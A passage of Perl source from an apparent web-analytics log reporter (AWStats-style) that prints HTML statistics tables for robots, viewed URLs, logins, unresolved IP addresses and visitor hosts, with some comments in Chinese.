			print "$Center<a name=\"extra$extranum\">&nbsp;</a>";
			my $title = $ExtraName[$extranum];
			&tab_head( "$title", 19, 0, "extra$extranum" );
			print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
			print "<th>" . $ExtraFirstColumnTitle[$extranum] . "</th>\n";

			if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
				print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>\n";
			}
			if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
				print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>\n";
			}
			if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
				print "<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>\n";
			}
			if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
				print "<th width=\"120\">" . _t("Last") . "</th>\n";
			}
			print "</tr>\n";
			$total_p = $total_h = $total_k = 0;

			#$max_h=1; foreach (values %_login_h) { if ($_ > $max_h) { $max_h = $_; } }
			#$max_k=1; foreach (values %_login_k) { if ($_ > $max_k) { $max_k = $_; } }
			my $count = 0;
			if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
				&BuildKeyList(
					$MaxRowsInHTMLOutput,
					$MinHitExtra[$extranum],
					\%{ '_section_' . $extranum . '_h' },
					\%{ '_section_' . $extranum . '_p' }
				);
			}
			else {
				&BuildKeyList(
					$MaxRowsInHTMLOutput,
					$MinHitExtra[$extranum],
					\%{ '_section_' . $extranum . '_h' },
					\%{ '_section_' . $extranum . '_h' }
				);
			}
			my %keysinkeylist = ();
			foreach my $key (@keylist) {
				$keysinkeylist{$key} = 1;
				my $firstcol = CleanXSS( DecodeEncodedString($key) );
				$total_p += ${ '_section_' . $extranum . '_p' }{$key};
				$total_h += ${ '_section_' . $extranum . '_h' }{$key};
				$total_k += ${ '_section_' . $extranum . '_k' }{$key};
				print "<tr>";
				printf( "<td class=\"aws\">$ExtraFirstColumnFormat[$extranum]</td>\n", $firstcol, $firstcol, $firstcol, $firstcol, $firstcol );
				if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
					print "<td>" . ${ '_section_' . $extranum . '_p' }{$key} . "</td>\n";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
					print "<td>" . ${ '_section_' . $extranum . '_h' }{$key} . "</td>\n";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
					print "<td>" . Format_Bytes( ${ '_section_' . $extranum . '_k' }{$key} ) . "</tr>\n";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
					print "<td>" . ( ${ '_section_' . $extranum . '_l' }{$key} ? Format_Date( ${ '_section_' . $extranum . '_l' }{$key}, 1 ) : '-' ) . "</td>\n";
				}
				print "</tr>\n";
				$count++;
			}

			# If we ask average or sum, we loop on all other records
			if (   $ExtraAddAverageRow[$extranum]
				|| $ExtraAddSumRow[$extranum] )
			{
				foreach ( keys %{ '_section_' . $extranum . '_h' } ) {
					if ( $keysinkeylist{$_} ) { next; }
					$total_p += ${ '_section_' . $extranum . '_p' }{$_};
					$total_h += ${ '_section_' . $extranum . '_h' }{$_};
					$total_k += ${ '_section_' . $extranum . '_k' }{$_};
					$count++;
				}
			}

			# Add average row
			if ( $ExtraAddAverageRow[$extranum] ) {
				print "<tr>";
				print "<td class=\"aws\"><b>" . _t("Average") . "</b></td>\n";
				if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
					print "<td>"
					  . ( $count ? Format_Number(( $total_p / $count )) : "&nbsp;" )
					  . "</td>\n";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
					print "<td>"
					  . ( $count ? Format_Number(( $total_h / $count )) : "&nbsp;" )
					  . "</td>\n";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
					print "<td>"
					  . (
						$count
						? Format_Bytes( $total_k / $count )
						: "&nbsp;"
					  )
					  . "</td>\n";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
					print "<td>&nbsp;</td>\n";
				}
				print "</tr>\n";
			}

			# Add sum row
			if ( $ExtraAddSumRow[$extranum] ) {
				print "<tr>";
				print "<td class=\"aws\"><b>" . _t("Sum") . "</b></td>\n";
				if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
					print "<td>" . ($total_p) . "</td>\n";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
					print "<td>" . ($total_h) . "</td>\n";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
					print "<td>" . Format_Bytes($total_k) . "</td>\n";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
					print "<td>&nbsp;</td>\n";
				}
				print "</tr>\n";
			}
			&tab_end();
			&html_end(1);
		}
	}
}

#------------------------------------------------------------------------------
# Function:     Prints the Robot details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowRobots{
	my $total_p = 0;
	my $total_h = 0;
	my $total_k = 0;
	my $total_r = 0;
	my $rest_p = 0;
	my $rest_h = 0;
	my $rest_k = 0;
	my $rest_r = 0;
	
	print "$Center<a name=\"robots\">&nbsp;</a>";
	my $title = '';
	if ( $HTMLOutput{'allrobots'} )  { $title .= _t("Robots"); }
	if ( $HTMLOutput{'lastrobots'} ) { $title .= _t("Last"); }
	&tab_head( "$title", 19, 0, 'robots' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>"
	  . Format_Number(( scalar keys %_robot_h ))
	  . " " . _t("Different robots") . "</th>\n";
	if ( $ShowRobotsStats =~ /H/i ) {
		print
		  "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>\n";
	}
	if ( $ShowRobotsStats =~ /B/i ) {
		print "<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>\n";
	}
	if ( $ShowRobotsStats =~ /L/i ) {
		print "<th width=\"120\">" . _t("Last") . "</th>\n";
	}
	print "</tr>\n";
	$total_p = $total_h = $total_k = $total_r = 0;
	my $count = 0;
	if ( $HTMLOutput{'allrobots'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Robot'},
			\%_robot_h, \%_robot_h );
	}
	if ( $HTMLOutput{'lastrobots'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Robot'},
			\%_robot_h, \%_robot_l );
	}
	foreach my $key (@keylist) {
		print "<tr><td class=\"aws\">"
		  . ( $RobotsHashIDLib{$key} ? $RobotsHashIDLib{$key} : $key )
		  . "</td>\n";
		if ( $ShowRobotsStats =~ /H/i ) {
			print "<td>"
			  . Format_Number(( $_robot_h{$key} - $_robot_r{$key} ))
			  . ( $_robot_r{$key} ? "+$_robot_r{$key}" : "" ) . "</td>\n";
		}
		if ( $ShowRobotsStats =~ /B/i ) {
			print "<td>" . Format_Bytes( $_robot_k{$key} ) . "</td>\n";
		}
		if ( $ShowRobotsStats =~ /L/i ) {
			print "<td>"
			  . (
				$_robot_l{$key}
				? Format_Date( $_robot_l{$key}, 1 )
				: '-'
			  )
			  . "</td>\n";
		}
		print "</tr>\n";

		#$total_p += $_robot_p{$key}||0;
		$total_h += $_robot_h{$key};
		$total_k += $_robot_k{$key} || 0;
		$total_r += $_robot_r{$key} || 0;
		$count++;
	}

	# For bots we need to count Totals
	my $TotalPagesRobots =
	  0;    #foreach (values %_robot_p) { $TotalPagesRobots+=$_; }
	my $TotalHitsRobots = 0;
	foreach ( values %_robot_h ) { $TotalHitsRobots += $_; }
	my $TotalBytesRobots = 0;
	foreach ( values %_robot_k ) { $TotalBytesRobots += $_; }
	my $TotalRRobots = 0;
	foreach ( values %_robot_r ) { $TotalRRobots += $_; }
	$rest_p = 0;    #$rest_p=$TotalPagesRobots-$total_p;
	$rest_h = $TotalHitsRobots - $total_h;
	$rest_k = $TotalBytesRobots - $total_k;
	$rest_r = $TotalRRobots - $total_r;

	if ($Debug) {
		debug( "Total real / shown : $TotalPagesRobots / $total_p - $TotalHitsRobots / $total_h - $TotalBytesRobots / $total_k",
			2
		);
	}
	if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 || $rest_r > 0 )
	{               # All other robots
		print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Only first 10 robots shown") . "</span></td>\n";
		if ( $ShowRobotsStats =~ /H/i ) { print "<td>".Format_Number($rest_h)."</td>\n"; }
		if ( $ShowRobotsStats =~ /B/i ) {
			print "<td>" . ( Format_Bytes($rest_k) ) . "</td>\n";
		}
		if ( $ShowRobotsStats =~ /L/i ) { print "<td>&nbsp;</td>\n"; }
		print "</tr>\n";
	}
	&tab_end(
		"* " . _t("Hits on robots.txt") . ( $TotalRRobots ? " " . _t("Total") : "" ) );
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the URL, Entry or Exit details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowURLDetail{
	my $total_p = 0;
	my $total_e = 0;
	my $total_k = 0;
	my $total_x = 0;
	# Call to plugins' function ShowPagesFilter
	foreach
	  my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesFilter'} } )
	{
		my $function = "ShowPagesFilter_$pluginname";
		&$function();
	}
	print "$Center<a name=\"urls\">&nbsp;</a>";

	# Show filter form
	&HTMLShowFormFilter( "urlfilter", $FilterIn{'url'}, $FilterEx{'url'} );

	# Show URL list
	my $title = '';
	my $cpt   = 0;
	my $mode  = '';
	if ( $HTMLOutput{'urldetail'} ) {
		$title = _t("Viewed pages");
		$cpt   = ( scalar keys %_url_p );
		$mode  = 'detail';
	}
	if ( $HTMLOutput{'urlentry'} ) {
		$title = _t("Entry");
		$cpt   = ( scalar keys %_url_e );
		$mode  = 'entry';
	}
	if ( $HTMLOutput{'urlexit'} ) {
		$title = _t("Exit");
		$cpt   = ( scalar keys %_url_x );
		$mode  = 'exit';
	}
	&tab_head( "$title", 19, 0, 'urls' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>";
	if ( $FilterIn{'url'} || $FilterEx{'url'} ) {
		if ( $FilterIn{'url'} ) {
			print _t("Filter") . " <b>$FilterIn{'url'}</b>";
		}
		if ( $FilterIn{'url'} && $FilterEx{'url'} ) { print " - "; }
		if ( $FilterEx{'url'} ) {
			print _t("Exclude filter") . " <b>$FilterEx{'url'}</b>";
		}
		if ( $FilterIn{'url'} || $FilterEx{'url'} ) { print ": "; }
		print Format_Number($cpt)." " . _t("Different pages");
		if ( $MonthRequired ne 'all' ) {
			if ( $HTMLOutput{'urldetail'} ) {
				print "<br>" . _t("Total") . ": ".Format_Number($TotalDifferentPages)." " . _t("Different pages");
			}
		}
	}
	else { print _t("Total") . ": ".Format_Number($cpt)." " . _t("Different pages"); }
	print "</th>\n";
	if ( $ShowPagesStats =~ /P/i ) {
		print
		  "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>\n";
	}
	if ( $ShowPagesStats =~ /B/i ) {
		print "<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Average") . "</th>\n";
	}
	if ( $ShowPagesStats =~ /E/i ) {
		print
		  "<th bgcolor=\"#$color_e\" width=\"80\">" . _t("Entry") . "</th>\n";
	}
	if ( $ShowPagesStats =~ /X/i ) {
		print
		  "<th bgcolor=\"#$color_x\" width=\"80\">" . _t("Exit") . "</th>\n";
	}

	# Call to plugins' function ShowPagesAddField
	foreach
	  my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
	{

		#    			my $function="ShowPagesAddField_$pluginname('title')";
		#    			eval("$function");
		my $function = "ShowPagesAddField_$pluginname";
		&$function('title');
	}
	print "<th>&nbsp;</th></tr>\n";
	$total_p = $total_k = $total_e = $total_x = 0;
	my $count = 0;
	if ( $HTMLOutput{'urlentry'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \%_url_e,
			\%_url_e );
	}
	elsif ( $HTMLOutput{'urlexit'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \%_url_x,
			\%_url_x );
	}
	else {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \%_url_p,
			\%_url_p );
	}
	my $max_p = 1;
	my $max_k = 1;
	foreach my $key (@keylist) {
		if ( $_url_p{$key} > $max_p ) { $max_p = $_url_p{$key}; }
		if ( $_url_k{$key} / ( $_url_p{$key} || 1 ) > $max_k ) {
			$max_k = $_url_k{$key} / ( $_url_p{$key} || 1 );
		}
	}
	foreach my $key (@keylist) {
		print "<tr><td class=\"aws\">";
		&HTMLShowURLInfo($key);
		print "</td>\n";
		my $bredde_p = 0;
		my $bredde_e = 0;
		my $bredde_x = 0;
		my $bredde_k = 0;
		if ( $max_p > 0 ) {
			$bredde_p =
			  int( $BarWidth * ( $_url_p{$key} || 0 ) / $max_p ) + 1;
		}
		if ( ( $bredde_p == 1 ) && $_url_p{$key} ) { $bredde_p = 2; }
		if ( $max_p > 0 ) {
			$bredde_e =
			  int( $BarWidth * ( $_url_e{$key} || 0 ) / $max_p ) + 1;
		}
		if ( ( $bredde_e == 1 ) && $_url_e{$key} ) { $bredde_e = 2; }
		if ( $max_p > 0 ) {
			$bredde_x =
			  int( $BarWidth * ( $_url_x{$key} || 0 ) / $max_p ) + 1;
		}
		if ( ( $bredde_x == 1 ) && $_url_x{$key} ) { $bredde_x = 2; }
		if ( $max_k > 0 ) {
			$bredde_k =
			  int( $BarWidth *
				  ( ( $_url_k{$key} || 0 ) / ( $_url_p{$key} || 1 ) ) /
				  $max_k ) + 1;
		}
		if ( ( $bredde_k == 1 ) && $_url_k{$key} ) { $bredde_k = 2; }
		if ( $ShowPagesStats =~ /P/i ) {
			print "<td>".Format_Number($_url_p{$key})."</td>\n";
		}
		if ( $ShowPagesStats =~ /B/i ) {
			print "<td>"
			  . (
				$_url_k{$key}
				? Format_Bytes(
					$_url_k{$key} / ( $_url_p{$key} || 1 )
				  )
				: "&nbsp;"
			  )
			  . "</td>\n";
		}
		if ( $ShowPagesStats =~ /E/i ) {
			print "<td>"
			  . ( $_url_e{$key} ? Format_Number($_url_e{$key}) : "&nbsp;" ) . "</td>\n";
		}
		if ( $ShowPagesStats =~ /X/i ) {
			print "<td>"
			  . ( $_url_x{$key} ? Format_Number($_url_x{$key}) : "&nbsp;" ) . "</td>\n";
		}

		# Call to plugins' function ShowPagesAddField
		foreach my $pluginname (
			keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
		{

		  #    				my $function="ShowPagesAddField_$pluginname('$key')";
		  #    				eval("$function");
			my $function = "ShowPagesAddField_$pluginname";
			&$function($key);
		}
		print "<td class=\"aws\">";

		# alt and title are not provided to reduce page size
		if ( $ShowPagesStats =~ /P/i ) {
			print "<div style=\"background-color: #$color_p; width: ${bredde_p}px; height: 4px; border-radius: 2px; margin-bottom: 2px;\"></div>";
		}
		if ( $ShowPagesStats =~ /B/i ) {
			print "<div style=\"background-color: #$color_k; width: ${bredde_k}px; height: 4px; border-radius: 2px; margin-bottom: 2px;\"></div>";
		}
		if ( $ShowPagesStats =~ /E/i ) {
			print "<div style=\"background-color: #$color_e; width: ${bredde_e}px; height: 4px; border-radius: 2px; margin-bottom: 2px;\"></div>";
		}
		if ( $ShowPagesStats =~ /X/i ) {
			print "<div style=\"background-color: #$color_x; width: ${bredde_x}px; height: 4px; border-radius: 2px;\"></div>";
		}
		print "</td>\n</tr>\n";
		$total_p += $_url_p{$key};
		$total_e += $_url_e{$key};
		$total_x += $_url_x{$key};
		$total_k += $_url_k{$key};
		$count++;
	}
	if ($Debug) {
		debug( "Total real / shown : $TotalPages / $total_p - $TotalEntries / $total_e - $TotalExits / $total_x - $TotalBytesPages / $total_k", 2 );
	}
	my $rest_p = $TotalPages - $total_p;
	my $rest_k = $TotalBytesPages - $total_k;
	my $rest_e = $TotalEntries - $total_e;
	my $rest_x = $TotalExits - $total_x;
	my $other_text = '';
	if ( $HTMLOutput{'urldetail'} ) {
		$other_text = _t("Other pages");
	} elsif ( $HTMLOutput{'urlentry'} ) {
		$other_text = _t("Failed to obtain access record");
	} elsif ( $HTMLOutput{'urlexit'} ) {
		$other_text = _t("Failed to obtain leave record");
	} else {
		$other_text = _t("Others");
	}
	
	if ( $rest_p > 0 || $rest_e > 0 || $rest_k > 0 ) {
		print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . $other_text . "</span></td>\n";
		if ( $ShowPagesStats =~ /P/i ) {
			print "<td>" . ( $rest_p ? Format_Number($rest_p) : "&nbsp;" ) . "</td>\n";
		}
		if ( $ShowPagesStats =~ /B/i ) {
			print "<td>"
			  . (
				$rest_k
				? Format_Bytes( $rest_k / ( $rest_p || 1 ) )
				: "&nbsp;"
			  )
			  . "</td>\n";
		}
		if ( $ShowPagesStats =~ /E/i ) {
			print "<td>" . ( $rest_e ? Format_Number($rest_e) : "&nbsp;" ) . "</td>\n";
		}
		if ( $ShowPagesStats =~ /X/i ) {
			print "<td>" . ( $rest_x ? Format_Number($rest_x) : "&nbsp;" ) . "</td>\n";
		}

		# Call to plugins' function ShowPagesAddField
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
		{
			my $function = "ShowPagesAddField_$pluginname";
			&$function('');
		}
		print "<td>&nbsp;</td>\n</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Login details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowLogins{
	my $total_p = 0;
	my $total_h = 0;
	my $total_k = 0;
	my $rest_p = 0;
	my $rest_h = 0;
	my $rest_k = 0;
	print "$Center<a name=\"logins\">&nbsp;</a>";
	my $title = '';
	if ( $HTMLOutput{'alllogins'} )  { $title .= _t("Login"); }
	if ( $HTMLOutput{'lastlogins'} ) { $title .= _t("Last"); }
	&tab_head( "$title", 19, 0, 'logins' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("Login") . " : "
	  . Format_Number(( scalar keys %_login_h )) . "</th>\n";
	&HTMLShowUserInfo('__title__');
	if ( $ShowAuthenticatedUsers =~ /P/i ) {
		print
		  "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>\n";
	}
	if ( $ShowAuthenticatedUsers =~ /H/i ) {
		print
		  "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>\n";
	}
	if ( $ShowAuthenticatedUsers =~ /B/i ) {
		print "<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>\n";
	}
	if ( $ShowAuthenticatedUsers =~ /L/i ) {
		print "<th width=\"120\">" . _t("Last") . "</th>\n";
	}
	print "</tr>\n";
	$total_p = $total_h = $total_k = 0;
	my $count = 0;
	if ( $HTMLOutput{'alllogins'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Login'},
			\%_login_h, \%_login_p );
	}
	if ( $HTMLOutput{'lastlogins'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Login'},
			\%_login_h, \%_login_l );
	}
	foreach my $key (@keylist) {
		print "<tr><td class=\"aws\">$key</td>\n";
		&HTMLShowUserInfo($key);
		if ( $ShowAuthenticatedUsers =~ /P/i ) {
			print "<td>"
			  . ( $_login_p{$key} ? Format_Number($_login_p{$key}) : "&nbsp;" )
			  . "</td>\n";
		}
		if ( $ShowAuthenticatedUsers =~ /H/i ) {
			print "<td>".Format_Number($_login_h{$key})."</td>\n";
		}
		if ( $ShowAuthenticatedUsers =~ /B/i ) {
			print "<td>" . Format_Bytes( $_login_k{$key} ) . "</td>\n";
		}
		if ( $ShowAuthenticatedUsers =~ /L/i ) {
			print "<td>"
			  . (
				$_login_l{$key}
				? Format_Date( $_login_l{$key}, 1 )
				: '-'
			  )
			  . "</td>\n";
		}
		print "</tr>\n";
		$total_p += $_login_p{$key} || 0;
		$total_h += $_login_h{$key};
		$total_k += $_login_k{$key} || 0;
		$count++;
	}
	if ($Debug) {
		debug( "Total real / shown : $TotalPages / $total_p - $TotalHits / $total_h - $TotalBytes / $total_h", 2 );
	}
	$rest_p = $TotalPages - $total_p;
	$rest_h = $TotalHits - $total_h;
	$rest_k = $TotalBytes - $total_k;
	# All other logins and/or anonymous
	if ( ($rest_p > 0 || $rest_h > 0 || $rest_k > 0) && $count >= 10 ) {    
		print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Anonymous") . "</span></td>\n";
		&HTMLShowUserInfo('');
		if ( $ShowAuthenticatedUsers =~ /P/i ) { print "<td>" . ( $rest_p ? Format_Number($rest_p) : "&nbsp;" ) . "</td>\n"; }
		if ( $ShowAuthenticatedUsers =~ /H/i ) { print "<td>".Format_Number($rest_h)."</td>\n"; }
		if ( $ShowAuthenticatedUsers =~ /B/i ) { print "<td>" . Format_Bytes($rest_k) . "</td>\n"; }
		if ( $ShowAuthenticatedUsers =~ /L/i ) { print "<td>&nbsp;</td>\n"; }
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     HTMLShowHostsUnknown - 显示未解析IP地址的详细页面
# Description:  生成未解析IP地址的完整列表页面（点击主页面"Unresolved IP Address"链接时调用）
# Parameters:   无
# Input:        全局变量 %_host_h, %_host_p, %_host_k, %_host_l 等
# Output:       HTML格式的未解析IP地址统计表格
# Return:       无
#------------------------------------------------------------------------------
sub HTMLShowHostsUnknown{
	my $total_p = 0;
	my $total_h = 0;
	my $total_k = 0;
	my $rest_p = 0;
	my $rest_h = 0;
	my $rest_k = 0;
	print "$Center<a name=\"unknownip\">&nbsp;</a>";
	&tab_head( _t("Unresolved IP Address"), 19, 0, 'unknownwip' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<th width=\"200\">"
	  . Format_Number(( scalar keys %_host_h ))
	  . " " . _t("Unresolved IP Address") . "</th>\n";
	  
	&HTMLShowHostInfo('__title__');
	if ( $ShowHostsStats =~ /P/i ) {
		print
		  "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>\n";
	}
	if ( $ShowHostsStats =~ /H/i ) {
		print
		  "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>\n";
	}
	if ( $ShowHostsStats =~ /B/i ) {
		print "<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>\n";
	}
	if ( $ShowHostsStats =~ /L/i ) {
		print "<th width=\"120\">" . _t("Last") . "</th>\n";
	}
	print "</tr>\n";
	
	$total_p = $total_h = $total_k = 0;
	my $count = 0;
	&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \%_host_h, \%_host_p );
		
	foreach my $key (@keylist) {
		my $host = CleanXSS($key);
		print "<tr>";
		print "<td class=\"aws\" width=\"200\">$host</td>\n";
		
		&HTMLShowHostInfo($key);
		if ( $ShowHostsStats =~ /P/i ) {
			print "<td>"
			  . ( $_host_p{$key} ? Format_Number($_host_p{$key}) : "&nbsp;" )
			  . "</td>\n";
		}
		if ( $ShowHostsStats =~ /H/i ) {
			print "<td>".Format_Number($_host_h{$key})."</td>\n";
		}
		if ( $ShowHostsStats =~ /B/i ) {
			print "<td>" . Format_Bytes( $_host_k{$key} ) . "</td>\n";
		}
		if ( $ShowHostsStats =~ /L/i ) {
			print "<td>"
			  . (
				$_host_l{$key}
				? Format_Date( $_host_l{$key}, 1 )
				: '-'
			  )
			  . "</td>\n";
		}
		print "</tr>\n";
		$total_p += $_host_p{$key};
		$total_h += $_host_h{$key};
		$total_k += $_host_k{$key} || 0;
		$count++;
	}
	
	if ($Debug) {
		debug( "Total real / shown : $TotalPages / $total_p - $TotalHits / $total_h - $TotalBytes / $total_h", 2 );
	}
	$rest_p = $TotalPages - $total_p;
	$rest_h = $TotalHits - $total_h;
	$rest_k = $TotalBytes - $total_k;
	# All other visitors (known or not)
	if ( ($rest_p > 0 || $rest_h > 0 || $rest_k > 0) && $count >= 10 ) {
		print "<tr><td class=\"aws\" width=\"200\"><span style=\"color: #$color_other\">" . _t("Low Traffic IP Summary") . "</span></td>\n";
		&HTMLShowHostInfo('');
		if ( $ShowHostsStats =~ /P/i ) { print "<td>" . ( $rest_p ? Format_Number($rest_p) : "&nbsp;" ) . "</td>\n"; }
		if ( $ShowHostsStats =~ /H/i ) { print "<td>".Format_Number($rest_h)."</td>\n"; }
		if ( $ShowHostsStats =~ /B/i ) { print "<td>" . Format_Bytes($rest_k) . "</td>\n"; }
		if ( $ShowHostsStats =~ /L/i ) { print "<td>&nbsp;</td>\n"; }
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     HTMLShowHosts - 显示访问者完整列表页面
# Description:  生成所有访问者（IP/主机名）的详细统计列表，包含分页和过滤功能
# Parameters:   无
# Input:        %_host_h, %_host_p, %_host_k, %_host_l, $FilterIn{'host'}, $FilterEx{'host'}
# Output:       HTML格式的访问者完整统计表格
# Return:       无
# Notes:        点击主页面"Full list"链接时调用，支持按IP/主机名过滤
#------------------------------------------------------------------------------
sub HTMLShowHosts{
	my $total_p = 0;
	my $total_h = 0;
	my $total_k = 0;
	my $rest_p = 0;
	my $rest_h = 0;
	my $rest_k = 0;
	my $title = '';
	print "$Center<a name=\"hosts\">&nbsp;</a>";

	# Show filter form
	&HTMLShowFormFilter( "hostfilter", $FilterIn{'host'},
		$FilterEx{'host'} );

	# Show hosts list
	my $cpt   = 0;
	if ( $HTMLOutput{'allhosts'} ) {
		$title .= _t("Visitors");
		$cpt = ( scalar keys %_host_h );
	}
	if ( $HTMLOutput{'lasthosts'} ) {
		$title .= _t("Last");
		$cpt = ( scalar keys %_host_h );
	}
	&tab_head( "$title", 19, 0, 'hosts' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>";
	print "<th width=\"200\">";
	if ( $FilterIn{'host'} || $FilterEx{'host'} ) {    # With filter
		if ( $FilterIn{'host'} ) {
			print _t("Filter") . " '<b>$FilterIn{'host'}</b>'";
		}
		if ( $FilterIn{'host'} && $FilterEx{'host'} ) { print " - "; }
		if ( $FilterEx{'host'} ) {
			print _t("Exclude filter") . " '<b>$FilterEx{'host'}</b>'";
		}
		if ( $FilterIn{'host'} || $FilterEx{'host'} ) { print ": "; }
		print "$cpt " . _t("Visitors");
		if ( $MonthRequired ne 'all' ) {
			if ( $HTMLOutput{'allhosts'} || $HTMLOutput{'lasthosts'} ) {
				print "<br>" . _t("Total") . ": ".Format_Number($TotalHostsKnown)." " . _t("Known") . ", ".Format_Number($TotalHostsUnknown)." " . _t("Unknown Visitor") . " - ".Format_Number($TotalUnique)." " . _t("Unique visitors");
			}
		}
	}
	else {    # Without filter
		if ( $MonthRequired ne 'all' ) {
			print _t("Total") . " : ".Format_Number($TotalHostsKnown)." " . _t("Known") . ", ".Format_Number($TotalHostsUnknown)." " . _t("Unknown Visitor (Total)") . " - ".Format_Number($TotalUnique)." " . _t("Unique visitors");
		}
		else { print _t("Total") . " : " . Format_Number(( scalar keys %_host_h )); }
	}
	print "</th>\n";
	&HTMLShowHostInfo('__title__');
	if ( $ShowHostsStats =~ /P/i ) {
		print
		  "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>\n";
	}
	if ( $ShowHostsStats =~ /H/i ) {
		print
		  "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>\n";
	}
	if ( $ShowHostsStats =~ /B/i ) {
		print "<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>\n";
	}
	if ( $ShowHostsStats =~ /L/i ) {
		print "<th width=\"120\">" . _t("Last") . "</th>\n";
	}
	print "</tr>\n";
	$total_p = $total_h = $total_k = 0;
	my $count = 0;
	if ( $HTMLOutput{'allhosts'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \%_host_h, \%_host_p );
	}
	if ( $HTMLOutput{'lasthosts'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \%_host_h, \%_host_l );
	}
	my $regipv4=qr/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;

	if ( $DynamicDNSLookup == 2 ) {
		# Use static DNS file
		&Read_DNS_Cache( \%MyDNSTable, "$DNSStaticCacheFile", "", 1 );
	}

	foreach my $key (@keylist) {
		my $host = CleanXSS($key);
		print "<td class=\"aws\" width=\"200\">"
		  . ( $_robot_l{$key} ? '<b>'  : '' ) . "$host"
		  . ( $_robot_l{$key} ? '</b>' : '' );

		if ($DynamicDNSLookup) {
			# Dynamic reverse DNS lookup
					if ($host =~ /$regipv4/o) {
							my $lookupresult=lc(gethostbyaddr(pack("C4",split(/\./,$host)),AF_INET));       # This may be slow
							if (! $lookupresult || $lookupresult =~ /$regipv4/o || ! IsAscii($lookupresult)) {
					if ( $DynamicDNSLookup == 2 ) {
						# Check static DNS file
						$lookupresult = $MyDNSTable{$host};
						if ($lookupresult) { print " ($lookupresult)"; }
						else { print ""; }
					}
					else { print ""; }
							}
							else { print " ($lookupresult)"; }
					}
		}

		print "</td>\n";
		&HTMLShowHostInfo($key);
		if ( $ShowHostsStats =~ /P/i ) {
			print "<td>"
			  . ( $_host_p{$key} ? Format_Number($_host_p{$key}) : "&nbsp;" )
			  . "</td>\n";
		}
		if ( $ShowHostsStats =~ /H/i ) {
			print "<td>".Format_Number($_host_h{$key})."</td>\n";
		}
		if ( $ShowHostsStats =~ /B/i ) {
